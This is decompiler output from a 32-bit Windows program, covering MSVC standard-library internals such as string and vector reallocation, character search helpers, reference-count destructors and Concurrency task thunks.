//----- (0040A390) --------------------------------------------------------
void **__thiscall sub_40A390(void **this, void *a2, size_t Size)
{
  unsigned int v4; // ecx
  void *v5; // ebx
  size_t v7; // ebx
  unsigned int v8; // edx
  unsigned int v9; // ecx
  void *v10; // eax
  void *v11; // ecx
  _DWORD *v12; // eax
  void *v13; // eax
  unsigned int v14; // [esp+Ch] [ebp-Ch]
  _DWORD *v15; // [esp+14h] [ebp-4h]

  v4 = (unsigned int)this[5];
  v14 = v4;
  if ( Size > v4 )
  {
    if ( Size > 0x7FFFFFFF )
      sub_404900();
    v7 = Size | 0xF;
    if ( (Size | 0xF) <= 0x7FFFFFFF )
    {
      v8 = v4 >> 1;
      if ( v4 <= 0x7FFFFFFF - (v4 >> 1) )
      {
        if ( v7 < v8 + v4 )
          v7 = v8 + v4;
      }
      else
      {
        v7 = 0x7FFFFFFF;
      }
    }
    else
    {
      v7 = 0x7FFFFFFF;
    }
    v9 = __CFADD__(v7, 1) ? -1 : v7 + 1;
    if ( v9 < 0x1000 )
    {
      if ( v9 )
        v12 = operator new(__CFADD__(v7, 1) ? -1 : v7 + 1);
      else
        v12 = 0;
    }
    else
    {
      if ( v9 + 35 <= v9 )
        sub_403CC0();
      v10 = operator new(v9 + 35);
      v11 = v10;
      if ( !v10 )
        goto LABEL_25;
      v12 = (_DWORD *)(((unsigned int)v10 + 35) & 0xFFFFFFE0);
      *(v12 - 1) = v11;
    }
    v15 = v12;
    this[4] = (void *)Size;
    this[5] = (void *)v7;
    memmove(v12, a2, Size);
    *((_BYTE *)v15 + Size) = 0;
    if ( v14 < 0x10 )
    {
LABEL_24:
      *this = v15;
      return this;
    }
    v13 = *this;
    if ( v14 + 1 < 0x1000 )
    {
LABEL_23:
      sub_44775B(v13);
      goto LABEL_24;
    }
    if ( (unsigned int)v13 - *((_DWORD *)v13 - 1) - 4 <= 0x1F )
    {
      v13 = (void *)*((_DWORD *)v13 - 1);
      goto LABEL_23;
    }
LABEL_25:
    _invalid_parameter_noinfo_noreturn();
  }
  v5 = this;
  if ( v4 >= 0x10 )
    v5 = *this;
  this[4] = (void *)Size;
  memmove_0(v5, a2, Size);
  *((_BYTE *)v5 + Size) = 0;
  return this;
}
// 403CC0: using guessed type void __noreturn sub_403CC0(void);
// 404900: using guessed type void __noreturn sub_404900(void);

//----- (0040A4D0) --------------------------------------------------------
void **__thiscall sub_40A4D0(void **Src, void *Srca, size_t Size)
{
  unsigned int v4; // edx
  char *v5; // ecx
  void *v6; // eax
  char *v7; // esi

  v4 = (unsigned int)Src[5];
  v5 = (char *)Src[4];
  if ( Size > v4 - (unsigned int)v5 )
    return sub_40AD00(Src, Size, (int)Srca, Srca, Size);
  Src[4] = &v5[Size];
  v6 = Src;
  if ( v4 >= 0x10 )
    v6 = *Src;
  v7 = &v5[(_DWORD)v6];
  memmove_0(&v5[(_DWORD)v6], Srca, Size);
  v7[Size] = 0;
  return Src;
}

//----- (0040A530) --------------------------------------------------------
void __thiscall sub_40A530(_DWORD *this, _DWORD *Src)
{
  _OWORD *v2; // esi
  unsigned int v4; // ebx
  int v5; // eax
  size_t v6; // eax
  void *v7; // eax
  _DWORD *v8; // ecx
  void *Srca; // [esp+14h] [ebp+8h]

  v2 = Src;
  v4 = Src[4];
  if ( Src[5] >= 0x10u )
    v2 = (_OWORD *)*Src;
  if ( v4 >= 0x10 )
  {
    v5 = v4 | 0xF;
    if ( (v4 | 0xF) > 0x7FFFFFFF )
      v5 = 0x7FFFFFFF;
    Srca = (void *)v5;
    v6 = v5 + 1;
    if ( v6 < 0x1000 )
    {
      if ( v6 )
        v8 = operator new(v6);
      else
        v8 = 0;
    }
    else
    {
      if ( v6 + 35 <= v6 )
        sub_403CC0();
      v7 = operator new(v6 + 35);
      if ( !v7 )
        _invalid_parameter_noinfo_noreturn();
      v8 = (_DWORD *)(((unsigned int)v7 + 35) & 0xFFFFFFE0);
      *(v8 - 1) = v7;
    }
    *this = v8;
    memmove(v8, v2, v4 + 1);
    this[4] = v4;
    this[5] = Srca;
  }
  else
  {
    *(_OWORD *)this = *v2;
    this[4] = v4;
    this[5] = 15;
  }
}
// 403CC0: using guessed type void __noreturn sub_403CC0(void);

//----- (0040A5E0) --------------------------------------------------------
__int32 __cdecl sub_40A5E0(volatile __int32 *a1, __int32 a2)
{
  return _InterlockedExchange(a1, a2);
}

//----- (0040A5F0) --------------------------------------------------------
_DWORD *__thiscall sub_40A5F0(int *this, int a2, _DWORD *Src)
{
  int v4; // edi
  int v5; // ecx
  int v6; // eax
  unsigned int v7; // esi
  unsigned int v8; // ecx
  unsigned int v9; // edx
  unsigned int v10; // edi
  unsigned int v11; // eax
  void *v12; // eax
  _DWORD *v13; // esi
  int v14; // ecx
  int v15; // edx
  int v17; // [esp-8h] [ebp-3Ch]
  int v18; // [esp+0h] [ebp-34h] BYREF
  _DWORD *v19; // [esp+10h] [ebp-24h]
  int v20; // [esp+14h] [ebp-20h]
  int v21; // [esp+18h] [ebp-1Ch]
  int v22; // [esp+1Ch] [ebp-18h]
  void *Block; // [esp+20h] [ebp-14h]
  int *v24; // [esp+24h] [ebp-10h]
  int v25; // [esp+30h] [ebp-4h]

  v24 = &v18;
  v4 = *this;
  v5 = this[1] - *this;
  v22 = (a2 - v4) / 24;
  v20 = v5 / 24;
  if ( v5 / 24 == 178956970 )
    sub_404860();
  v6 = v5 / 24;
  v7 = v5 / 24 + 1;
  v8 = (this[2] - v4) / 24;
  v9 = v8 >> 1;
  if ( v8 <= 178956970 - (v8 >> 1) )
  {
    v10 = v9 + v8;
    if ( v9 + v8 < v7 )
      v10 = v6 + 1;
    v21 = v10;
  }
  else
  {
    v10 = v6 + 1;
    v21 = v6 + 1;
  }
  if ( v10 > 0xAAAAAAA )
    goto LABEL_19;
  v11 = 24 * v10;
  if ( 24 * v10 >= 0x1000 )
  {
    if ( v11 + 35 > v11 )
    {
      v12 = operator new(v11 + 35);
      if ( !v12 )
        _invalid_parameter_noinfo_noreturn();
      v13 = (_DWORD *)(((unsigned int)v12 + 35) & 0xFFFFFFE0);
      *(v13 - 1) = v12;
      goto LABEL_15;
    }
LABEL_19:
    sub_403CC0();
  }
  if ( v11 )
  {
    Block = operator new(24 * v10);
    v13 = Block;
    goto LABEL_16;
  }
  v13 = 0;
LABEL_15:
  Block = v13;
LABEL_16:
  v25 = 0;
  v19 = &v13[6 * v22];
  v22 = (int)(v19 + 6);
  sub_4055B0(v19, Src);
  v14 = *this;
  v15 = this[1];
  v17 = (int)v13;
  if ( a2 != v15 )
  {
    sub_4049B0(v14, a2, (int)v13);
    v15 = this[1];
    v14 = a2;
    v17 = v22;
  }
  sub_4049B0(v14, v15, v17);
  sub_404870(this, (int)v13, v20 + 1, v10);
  return v19;
}
// 403CC0: using guessed type void __noreturn sub_403CC0(void);
// 404860: using guessed type void __noreturn sub_404860(void);

//----- (0040A790) --------------------------------------------------------
char *__thiscall sub_40A790(int this, char *a2, char *a3)
{
  int v3; // edi
  int v4; // eax
  unsigned int v5; // ebx
  unsigned int v6; // ecx
  unsigned int v7; // edx
  unsigned int v8; // eax
  unsigned int v9; // ecx
  void *v10; // eax
  _DWORD *v11; // ebx
  char *v12; // edx
  _DWORD *v13; // ecx
  char *v14; // edi
  char *v15; // edx
  char *v16; // edi
  int v17; // esi
  _DWORD *v18; // edx
  int *v19; // eax
  char *result; // eax
  int v21; // [esp+10h] [ebp-20h]
  int v22; // [esp+14h] [ebp-1Ch]
  char *v23; // [esp+1Ch] [ebp-14h]

  v3 = (int)&a2[-*(_DWORD *)this] >> 3;
  v4 = (*(_DWORD *)(this + 4) - *(_DWORD *)this) >> 3;
  if ( v4 == 0x1FFFFFFF )
    sub_404860();
  v5 = v4 + 1;
  v22 = v4 + 1;
  v6 = (*(_DWORD *)(this + 8) - *(_DWORD *)this) >> 3;
  v7 = v6 >> 1;
  if ( v6 <= 0x1FFFFFFF - (v6 >> 1) )
  {
    v8 = v7 + v6;
    if ( v7 + v6 < v5 )
      v8 = v5;
  }
  else
  {
    v8 = v4 + 1;
  }
  if ( v8 > 0x1FFFFFFF )
    goto LABEL_37;
  v9 = 8 * v8;
  v21 = 2 * v8;
  if ( 8 * v8 < 0x1000 )
  {
    if ( v9 )
      v11 = operator new(8 * v8);
    else
      v11 = 0;
    goto LABEL_14;
  }
  if ( v9 + 35 <= v9 )
LABEL_37:
    sub_403CC0();
  v10 = operator new(v9 + 35);
  if ( !v10 )
    goto LABEL_39;
  v11 = (_DWORD *)(((unsigned int)v10 + 35) & 0xFFFFFFE0);
  *(v11 - 1) = v10;
LABEL_14:
  v12 = (char *)&v11[2 * v3];
  v23 = v12;
  *(_DWORD *)v12 = 0;
  if ( v12 != a3 )
  {
    *(_DWORD *)v12 = *(_DWORD *)a3;
    *(_DWORD *)a3 = 0;
  }
  v13 = v11;
  v12[4] = 1;
  v14 = *(char **)(this + 4);
  v15 = *(char **)this;
  if ( a2 == v14 )
  {
    for ( ; v15 != v14; v13 += 2 )
    {
      *v13 = 0;
      if ( v13 != (_DWORD *)v15 )
      {
        *v13 = *(_DWORD *)v15;
        *(_DWORD *)v15 = 0;
      }
      *((_BYTE *)v13 + 4) = 1;
      v15 += 8;
    }
  }
  else
  {
    for ( ; v15 != a2; v13 += 2 )
    {
      *v13 = 0;
      if ( v13 != (_DWORD *)v15 )
      {
        *v13 = *(_DWORD *)v15;
        *(_DWORD *)v15 = 0;
      }
      *((_BYTE *)v13 + 4) = 1;
      v15 += 8;
    }
    sub_40AE60(v13, v13);
    v13 = v23 + 8;
    v16 = *(char **)(this + 4);
    if ( a2 != v16 )
    {
      v17 = a2 - (char *)v13;
      do
      {
        v18 = (_DWORD *)((char *)v13 + v17);
        *v13 = 0;
        if ( v13 != (_DWORD *)((char *)v13 + v17) )
        {
          *v13 = *v18;
          *v18 = 0;
        }
        *((_BYTE *)v13 + 4) = 1;
        v13 += 2;
      }
      while ( (char *)v13 + v17 != v16 );
    }
  }
  sub_40AE60(v13, v13);
  if ( *(_DWORD *)this )
  {
    sub_40AE60(*(int **)this, *(int **)(this + 4));
    v19 = *(int **)this;
    if ( ((*(_DWORD *)(this + 8) - *(_DWORD *)this) & 0xFFFFFFF8) < 0x1000 )
    {
LABEL_35:
      sub_44775B(v19);
      goto LABEL_36;
    }
    if ( (unsigned int)v19 - *(v19 - 1) - 4 <= 0x1F )
    {
      v19 = (int *)*(v19 - 1);
      goto LABEL_35;
    }
LABEL_39:
    _invalid_parameter_noinfo_noreturn();
  }
LABEL_36:
  *(_DWORD *)this = v11;
  result = v23;
  *(_DWORD *)(this + 4) = &v11[2 * v22];
  *(_DWORD *)(this + 8) = &v11[v21];
  return result;
}
// 403CC0: using guessed type void __noreturn sub_403CC0(void);
// 404860: using guessed type void __noreturn sub_404860(void);

//----- (0040A9C0) --------------------------------------------------------
int __fastcall sub_40A9C0(unsigned __int16 *a1, int a2, int a3, __int16 *a4, int a5)
{
  __int16 *v7; // ecx
  __int16 *v8; // edx
  __int16 v9; // ax
  int v10; // ecx
  unsigned __int16 *i; // ecx
  int v12; // eax
  int v13; // ecx
  unsigned __int16 *j; // edx
  __int16 *v15; // ecx
  int v16; // eax
  char v18[260]; // [esp+10h] [ebp-108h] BYREF

  if ( !a5 || !a2 )
    return -1;
  memset(v18, 0, 0x100u);
  v7 = a4;
  v8 = &a4[a5];
  if ( a4 == v8 )
  {
LABEL_6:
    v10 = -1;
    if ( a2 )
      v10 = a2 - 1;
    for ( i = &a1[v10]; ; --i )
    {
      v12 = *i;
      if ( (unsigned __int16)v12 < 0x100u )
      {
        if ( v18[v12] )
          break;
      }
      if ( i == a1 )
        return -1;
    }
    return i - a1;
  }
  else
  {
    while ( 1 )
    {
      v9 = *v7;
      if ( (unsigned __int16)*v7 >= 0x100u )
        break;
      ++v7;
      v18[(unsigned __int8)v9] = 1;
      if ( v7 == v8 )
        goto LABEL_6;
    }
    v13 = -1;
    if ( a2 )
      v13 = a2 - 1;
    for ( j = &a1[v13]; ; --j )
    {
      v15 = a4;
      v16 = a5;
      if ( *a4 == *j )
        break;
      while ( v16 != 1 )
      {
        ++v15;
        --v16;
        if ( *v15 == *j )
        {
          if ( v15 )
            return j - a1;
          break;
        }
      }
      if ( j == a1 )
        return -1;
    }
    return j - a1;
  }
}
// 40A9C0: using guessed type char var_108[260];

//----- (0040AB20) --------------------------------------------------------
int __fastcall sub_40AB20(int a1, unsigned int a2, unsigned int a3, unsigned __int16 *a4, unsigned int a5)
{
  unsigned int v5; // ebx
  int result; // eax
  unsigned int v7; // edx
  unsigned __int16 *v8; // eax
  int v9; // esi
  unsigned __int16 v10; // dx
  int v11; // ecx
  unsigned __int16 *v12; // esi
  int v13; // ecx
  unsigned int v14; // edi
  unsigned __int16 *v15; // ecx
  bool v16; // cc
  unsigned __int16 v17; // dx
  int v19; // [esp+10h] [ebp-8h]
  unsigned __int16 v20; // [esp+14h] [ebp-4h]

  v5 = a5;
  if ( a5 <= a2 )
  {
    result = a3;
    v7 = a2 - a5;
    if ( a3 <= v7 )
    {
      if ( !a5 )
        return result;
      v8 = (unsigned __int16 *)(a1 + 2 * a3);
      v9 = a1 + 2 * (v7 + 1);
      v19 = v9;
      v10 = *a4;
      v20 = *a4;
      while ( 1 )
      {
        v11 = v9 - (_DWORD)v8;
        v12 = 0;
        v13 = v11 >> 1;
        if ( v13 )
        {
          if ( *v8 == v10 )
          {
LABEL_9:
            v12 = v8;
          }
          else
          {
            while ( v13 != 1 )
            {
              ++v8;
              --v13;
              if ( *v8 == v10 )
                goto LABEL_9;
            }
          }
        }
        if ( !v12 )
          break;
        v14 = v5;
        v15 = a4;
        if ( *v12 >= v20 )
        {
          v16 = *v12 <= v20;
          while ( 1 )
          {
            if ( !v16 )
            {
LABEL_16:
              v5 = a5;
              break;
            }
            if ( v14 == 1 )
              return ((int)v12 - a1) >> 1;
            v17 = *(unsigned __int16 *)((char *)v15++ + (char *)v12 - (char *)a4 + 2);
            --v14;
            v16 = v17 <= *v15;
            if ( v17 < *v15 )
              goto LABEL_16;
          }
        }
        v10 = *a4;
        v8 = v12 + 1;
        v9 = v19;
      }
    }
  }
  return -1;
}

//----- (0040ABF0) --------------------------------------------------------
// bad sp value at call has been detected, the output may be wrong!
void **__thiscall sub_40ABF0(void **this, size_t Size, int a3, char a4)
{
  unsigned int v5; // ecx
  size_t v6; // esi
  unsigned int v7; // edx
  unsigned int v8; // ecx
  void *v9; // eax
  _DWORD *v10; // edi
  void *v11; // eax
  unsigned int v13; // [esp+8h] [ebp-4h]

  if ( Size > 0x7FFFFFFF )
    sub_404900();
  v5 = (unsigned int)this[5];
  v13 = v5;
  v6 = Size | 0xF;
  if ( (Size | 0xF) <= 0x7FFFFFFF )
  {
    v7 = v5 >> 1;
    if ( v5 <= 0x7FFFFFFF - (v5 >> 1) )
    {
      if ( v6 < v7 + v5 )
        v6 = v7 + v5;
    }
    else
    {
      v6 = 0x7FFFFFFF;
    }
  }
  else
  {
    v6 = 0x7FFFFFFF;
  }
  v8 = __CFADD__(v6, 1) ? -1 : v6 + 1;
  if ( v8 < 0x1000 )
  {
    if ( v8 )
      v10 = operator new(__CFADD__(v6, 1) ? -1 : v6 + 1);
    else
      v10 = 0;
  }
  else
  {
    if ( v8 + 35 <= v8 )
      sub_403CC0();
    v9 = operator new(v8 + 35);
    if ( !v9 )
      goto LABEL_21;
    v10 = (_DWORD *)(((unsigned int)v9 + 35) & 0xFFFFFFE0);
    *(v10 - 1) = v9;
  }
  this[4] = (void *)Size;
  this[5] = (void *)v6;
  memset(v10, a4, Size);
  *((_BYTE *)v10 + Size) = 0;
  if ( v13 >= 0x10 )
  {
    v11 = *this;
    if ( v13 + 1 < 0x1000 )
    {
LABEL_19:
      sub_44775B(v11);
      goto LABEL_20;
    }
    if ( (unsigned int)v11 - *((_DWORD *)v11 - 1) - 4 <= 0x1F )
    {
      v11 = (void *)*((_DWORD *)v11 - 1);
      goto LABEL_19;
    }
LABEL_21:
    _invalid_parameter_noinfo_noreturn();
  }
LABEL_20:
  *this = v10;
  return this;
}
// 40ACEB: bad sp value at call
// 403CC0: using guessed type void __noreturn sub_403CC0(void);
// 404900: using guessed type void __noreturn sub_404900(void);

//----- (0040AD00) --------------------------------------------------------
void **__thiscall sub_40AD00(void **Src, unsigned int a2, int a3, const void *a4, size_t a5)
{
  size_t v6; // edx
  unsigned int v7; // edi
  unsigned int v8; // esi
  unsigned int v9; // ecx
  void *v10; // eax
  _DWORD *v11; // edi
  _DWORD *v12; // eax
  char *v13; // esi
  void *v14; // esi
  void **result; // eax
  unsigned int v16; // [esp+10h] [ebp-Ch]
  size_t Size; // [esp+14h] [ebp-8h]
  size_t v18; // [esp+18h] [ebp-4h]
  _BYTE *v19; // [esp+18h] [ebp-4h]

  v6 = (size_t)Src[4];
  Size = v6;
  if ( 0x7FFFFFFF - v6 < a2 )
    sub_404900();
  v7 = (unsigned int)Src[5];
  v18 = v6 + a2;
  v8 = (v6 + a2) | 0xF;
  v16 = v7;
  if ( v8 <= 0x7FFFFFFF )
  {
    if ( v7 <= 0x7FFFFFFF - (v7 >> 1) )
    {
      if ( v8 < v7 + (v7 >> 1) )
        v8 = v7 + (v7 >> 1);
    }
    else
    {
      v8 = 0x7FFFFFFF;
    }
  }
  else
  {
    v8 = 0x7FFFFFFF;
  }
  v9 = __CFADD__(v8, 1) ? -1 : v8 + 1;
  if ( v9 < 0x1000 )
  {
    if ( v9 )
    {
      v12 = operator new(__CFADD__(v8, 1) ? -1 : v8 + 1);
      v6 = Size;
      v11 = v12;
    }
    else
    {
      v11 = 0;
    }
  }
  else
  {
    if ( v9 + 35 <= v9 )
      sub_403CC0();
    v10 = operator new(v9 + 35);
    if ( !v10 )
      goto LABEL_23;
    v6 = Size;
    v11 = (_DWORD *)(((unsigned int)v10 + 35) & 0xFFFFFFE0);
    *(v11 - 1) = v10;
  }
  Src[4] = (void *)v18;
  Src[5] = (void *)v8;
  v13 = (char *)v11 + v6;
  v19 = (char *)v11 + v6 + a5;
  if ( v16 >= 0x10 )
  {
    v14 = *Src;
    memmove(v11, *Src, v6);
    memmove((char *)v11 + Size, a4, a5);
    *v19 = 0;
    if ( v16 + 1 < 0x1000 )
    {
LABEL_19:
      sub_44775B(v14);
      *Src = v11;
      return Src;
    }
    if ( (unsigned int)v14 - *((_DWORD *)v14 - 1) - 4 <= 0x1F )
    {
      v14 = (void *)*((_DWORD *)v14 - 1);
      goto LABEL_19;
    }
LABEL_23:
    _invalid_parameter_noinfo_noreturn();
  }
  memmove(v11, Src, v6);
  memmove(v13, a4, a5);
  *v19 = 0;
  result = Src;
  *Src = v11;
  return result;
}
// 403CC0: using guessed type void __noreturn sub_403CC0(void);
// 404900: using guessed type void __noreturn sub_404900(void);

//----- (0040AE60) --------------------------------------------------------
void __fastcall sub_40AE60(int *a1, int *a2)
{
  int *i; // esi
  int v4; // ecx
  void (__stdcall ***v5)(int); // edx

  for ( i = a1; i != a2; i += 2 )
  {
    v4 = *i;
    if ( *i && !_InterlockedExchangeAdd((volatile signed __int32 *)(v4 + 4), 0xFFFFFFFF) )
    {
      v5 = *(void (__stdcall ****)(int))(v4 + 120);
      if ( v5 )
        (**v5)(v4);
      else
        (**(void (__stdcall ***)(int))v4)(1);
    }
  }
}

//----- (0040AEE0) --------------------------------------------------------
int __thiscall sub_40AEE0(void *this)
{
  int result; // eax

  if ( this )
    return (*(int (__thiscall **)(void *, int))(*(_DWORD *)this + 8))(this, 1);
  return result;
}

//----- (0040AEF0) --------------------------------------------------------
int __thiscall sub_40AEF0(int (__thiscall ***this)(_DWORD, _DWORD))
{
  return (*this[4])(this + 4, 0);
}

//----- (0040AF00) --------------------------------------------------------
void __thiscall sub_40AF00(_DWORD *this)
{
  sub_407180(this + 3);
}

//----- (0040AF10) --------------------------------------------------------
void __thiscall sub_40AF10(_DWORD *Src, unsigned int a2)
{
  unsigned int v3; // ebx
  unsigned int v4; // edi
  unsigned int v5; // ecx
  _DWORD *v6; // eax
  _DWORD *v7; // edi
  size_t v8; // [esp-8h] [ebp-18h]
  _DWORD *v9; // [esp+8h] [ebp-8h]
  int v10; // [esp+Ch] [ebp-4h]

  v3 = Src[5];
  if ( v3 < a2 )
  {
    v10 = Src[4];
    if ( 2147483646 - v10 < a2 - v10 )
      sub_404900();
    v4 = a2 | 7;
    if ( (a2 | 7) <= 0x7FFFFFFE )
    {
      v5 = v3 >> 1;
      if ( v3 <= 2147483646 - (v3 >> 1) )
      {
        if ( v4 < v5 + v3 )
          v4 = v5 + v3;
      }
      else
      {
        v4 = 2147483646;
      }
    }
    else
    {
      v4 = 2147483646;
    }
    v6 = sub_404910(__CFADD__(v4, 1) ? -1 : v4 + 1);
    Src[4] = a2;
    v9 = v6;
    Src[5] = v4;
    v8 = 2 * v10 + 2;
    if ( v3 < 8 )
    {
      memmove(v6, Src, v8);
      *Src = v9;
      Src[4] = v10;
    }
    else
    {
      v7 = (_DWORD *)*Src;
      memmove(v6, (const void *)*Src, v8);
      if ( 2 * v3 + 2 >= 0x1000 )
      {
        if ( (unsigned int)v7 - *(v7 - 1) - 4 > 0x1F )
          _invalid_parameter_noinfo_noreturn();
        v7 = (_DWORD *)*(v7 - 1);
      }
      sub_44775B(v7);
      *Src = v9;
      Src[4] = v10;
    }
  }
}
// 404900: using guessed type void __noreturn sub_404900(void);

//----- (0040B020) --------------------------------------------------------
_DWORD *__thiscall sub_40B020(_DWORD *Block, char a2)
{
  *Block = &std::_Ref_count_obj2<Concurrency::details::_Task_impl<unsigned char>>::`vftable';
  if ( (a2 & 1) != 0 )
    sub_44775B(Block);
  return Block;
}
// 49DE48: using guessed type void *std::_Ref_count_obj2<Concurrency::details::_Task_impl<unsigned char>>::`vftable';

//----- (0040B050) --------------------------------------------------------
_DWORD *__thiscall sub_40B050(_DWORD *Block, char a2)
{
  *Block = &std::_Ref_count_obj2<Concurrency::details::_ExceptionHolder>::`vftable';
  if ( (a2 & 1) != 0 )
    sub_44775B(Block);
  return Block;
}
// 49DF0C: using guessed type void *std::_Ref_count_obj2<Concurrency::details::_ExceptionHolder>::`vftable';

//----- (0040B080) --------------------------------------------------------
char **__thiscall sub_40B080(char **Src, int a2, char *a3, unsigned int a4)
{
  unsigned int v5; // ecx
  char *v6; // edx
  char *v7; // ecx
  int v8; // ebx
  unsigned int v10; // edx
  char *v11; // eax
  size_t v12; // edx
  char *v13; // esi
  int v14; // ecx
  char *v15; // esi
  char *v16; // [esp+Ch] [ebp-14h]
  void *v17; // [esp+Ch] [ebp-14h]
  char *v18; // [esp+10h] [ebp-10h]
  unsigned int v19; // [esp+14h] [ebp-Ch]
  char *Srca; // [esp+18h] [ebp-8h]
  char *Size; // [esp+1Ch] [ebp-4h]
  size_t Sizea; // [esp+1Ch] [ebp-4h]
  size_t Sizec; // [esp+1Ch] [ebp-4h]
  size_t Sizeb; // [esp+1Ch] [ebp-4h]

  v5 = (unsigned int)Src[5];
  v6 = Src[4];
  v16 = v6;
  v19 = v5;
  if ( a4 > v5 - (unsigned int)v6 )
  {
    if ( 2147483646 - (int)v6 < a4 )
      sub_404900();
    v18 = &v6[a4];
    v10 = (unsigned int)&v6[a4] | 7;
    if ( v10 <= 0x7FFFFFFE )
    {
      Sizea = v5 >> 1;
      if ( v5 <= 2147483646 - (v5 >> 1) )
      {
        if ( v10 < v5 + Sizea )
          v10 = v5 + Sizea;
      }
      else
      {
        v10 = 2147483646;
      }
    }
    else
    {
      v10 = 2147483646;
    }
    Sizec = v10;
    v11 = (char *)sub_404910(__CFADD__(v10, 1) ? -1 : v10 + 1);
    v12 = 2 * a4;
    Src[4] = v18;
    v13 = &v11[2 * a4];
    Src[5] = (char *)Sizec;
    Srca = v11;
    v14 = 2 * (_DWORD)v16 + 2;
    v17 = v13;
    Sizeb = v14;
    if ( v19 < 8 )
    {
      memmove(v11, a3, v12);
      memmove(v13, Src, Sizeb);
      *Src = Srca;
      return Src;
    }
    else
    {
      v15 = *Src;
      memmove(v11, a3, v12);
      memmove(v17, v15, Sizeb);
      if ( 2 * v19 + 2 >= 0x1000 )
      {
        if ( (unsigned int)&v15[-*((_DWORD *)v15 - 1) - 4] > 0x1F )
          _invalid_parameter_noinfo_noreturn();
        v15 = (char *)*((_DWORD *)v15 - 1);
      }
      sub_44775B(v15);
      *Src = Srca;
      return Src;
    }
  }
  else
  {
    Src[4] = &v6[a4];
    v7 = (char *)Src;
    Size = (char *)Src;
    if ( v19 >= 8 )
    {
      v7 = *Src;
      Size = *Src;
    }
    if ( &a3[2 * a4] <= v7 || a3 > &v7[2 * (_DWORD)v6] )
    {
      v8 = a4;
    }
    else if ( v7 > a3 )
    {
      v8 = (v7 - a3) >> 1;
    }
    else
    {
      v8 = 0;
    }
    memmove_0(&v7[2 * a4], v7, 2 * (_DWORD)v6 + 2);
    memmove(Size, a3, 2 * v8);
    memmove(&Size[2 * v8], &a3[2 * a4 + 2 * v8], 2 * (a4 - v8));
    return Src;
  }
}
// 404900: using guessed type void __noreturn sub_404900(void);

//----- (0040B250) --------------------------------------------------------
unsigned int __cdecl sub_40B250(int a1, unsigned int a2, unsigned int a3)
{
  unsigned int v3; // ecx
  unsigned int v4; // esi

  v3 = a1 | 0xF;
  if ( (a1 | 0xFu) > a3 )
    return a3;
  v4 = a2 >> 1;
  if ( a2 > a3 - (a2 >> 1) )
    return a3;
  if ( v3 < v4 + a2 )
    return v4 + a2;
  return v3;
}

//----- (0040B290) --------------------------------------------------------
int __stdcall sub_40B290(void *a1, _DWORD *a2, void **a3)
{
  *a2 = &std::_Generic_error_category::`vftable';
  a2[1] = 3;
  return 1;
}
// 48FAC8: using guessed type void *std::_Generic_error_category::`vftable';

//----- (0040B2B0) --------------------------------------------------------
int __stdcall sub_40B2B0(void *a1, void *a2, void **a3)
{
  if ( dword_500998 > *(_DWORD *)(*(_DWORD *)NtCurrentTeb()->ThreadLocalStoragePointer + 4) )
  {
    _Init_thread_header(&dword_500998);
    if ( dword_500998 == -1 )
    {
      dword_50099C = 0;
      dword_5009A0 = 0;
      atexit(sub_486C80);
      _Init_thread_footer(&dword_500998);
    }
  }
  dword_5009BC = (int)&dword_50099C;
  return 1;
}
// 447A70: using guessed type _DWORD __cdecl _Init_thread_footer(_DWORD);
// 447ABA: using guessed type _DWORD __cdecl _Init_thread_header(_DWORD);
// 500998: using guessed type int dword_500998;
// 50099C: using guessed type int dword_50099C;
// 5009A0: using guessed type int dword_5009A0;
// 5009BC: using guessed type int dword_5009BC;

//----- (0040B320) --------------------------------------------------------
int __stdcall sub_40B320(void *a1, _DWORD *a2, void **a3)
{
  *a2 = &std::_Future_error_category::`vftable';
  a2[1] = 1;
  return 1;
}
// 49DEF0: using guessed type void *std::_Future_error_category::`vftable';

//----- (0040B340) --------------------------------------------------------
void __thiscall sub_40B340(void *Block, char a2)
{
  if ( a2 )
    sub_44775B(Block);
}

//----- (0040B360) --------------------------------------------------------
char *__thiscall sub_40B360(char *this)
{
  return this + 4;
}

//----- (0040B370) --------------------------------------------------------
void ***sub_40B370()
{
  return &___R0_AV_lambda_1___CC____CancelAndRunContinuations____Task_impl_E_details_Concurrency__UAE_N_N00ABV__shared_ptr_U_ExceptionHolder_details_Concurrency___std___Z__8;
}
// 4FDC00: using guessed type void **___R0_AV_lambda_1___CC____CancelAndRunContinuations____Task_impl_E_details_Concurrency__UAE_N_N00ABV__shared_ptr_U_ExceptionHolder_details_Concurrency___std___Z__8;

//----- (0040B380) --------------------------------------------------------
int __thiscall sub_40B380(_DWORD *this)
{
  _DWORD *v1; // edi
  int result; // eax
  int v3; // esi

  v1 = (_DWORD *)this[1];
  result = v1[17];
  v1[17] = 0;
  if ( result )
  {
    do
    {
      v3 = *(_DWORD *)(result + 4);
      sub_4079B0(v1, result);
      result = v3;
    }
    while ( v3 );
  }
  return result;
}

//----- (0040B3B0) --------------------------------------------------------
_DWORD *__thiscall sub_40B3B0(_DWORD *this, _DWORD *a2)
{
  _DWORD *result; // eax

  result = a2;
  *a2 = ___7___Func_impl_no_alloc_V_lambda_1___CC____CancelAndRunContinuations____Task_impl_E_details_Concurrency__UAE_N_N00ABV__shared_ptr_U_ExceptionHolder_details_Concurrency___std___Z_X__V_std__6B_;
  a2[1] = this[1];
  return result;
}
// 49DDCC: using guessed type int (__stdcall *___7___Func_impl_no_alloc_V_lambda_1___CC____CancelAndRunContinuations____Task_impl_E_details_Concurrency__UAE_N_N00ABV__shared_ptr_U_ExceptionHolder_details_Concurrency___std___Z_X__V_std__6B_[2])(int);

//----- (0040B3D0) --------------------------------------------------------
char *__thiscall sub_40B3D0(int this, char a2)
{
  int v3; // ecx

  v3 = *(_DWORD *)(this + 168);
  if ( !v3 )
    sub_406FA0(0);
  sub_407670(v3);
  return sub_409280((char *)this, a2);
}

//----- (0040B400) --------------------------------------------------------
int __thiscall sub_40B400(_DWORD *this)
{
  int v1; // ecx

  v1 = this[42];
  if ( !v1 )
    sub_406FA0(0);
  return sub_407670(v1);
}

//----- (0040B420) --------------------------------------------------------
void __thiscall sub_40B420(_DWORD *Block, char a2)
{
  _DWORD *v3; // ecx

  v3 = (_DWORD *)Block[11];
  if ( v3 )
  {
    (*(void (__stdcall **)(bool))(*v3 + 16))(v3 != Block + 2);
    Block[11] = 0;
  }
  if ( a2 )
    sub_44775B(Block);
}

//----- (0040B460) --------------------------------------------------------
char *__thiscall sub_40B460(char *this)
{
  return this + 8;
}

//----- (0040B470) --------------------------------------------------------
void ***sub_40B470()
{
  return &___R0_AV_lambda_1___1___MakeVoidToUnitFunc_details_Concurrency__YA_AV__function___A6AEXZ_std__ABV__function___A6AXXZ_5__Z__8;
}
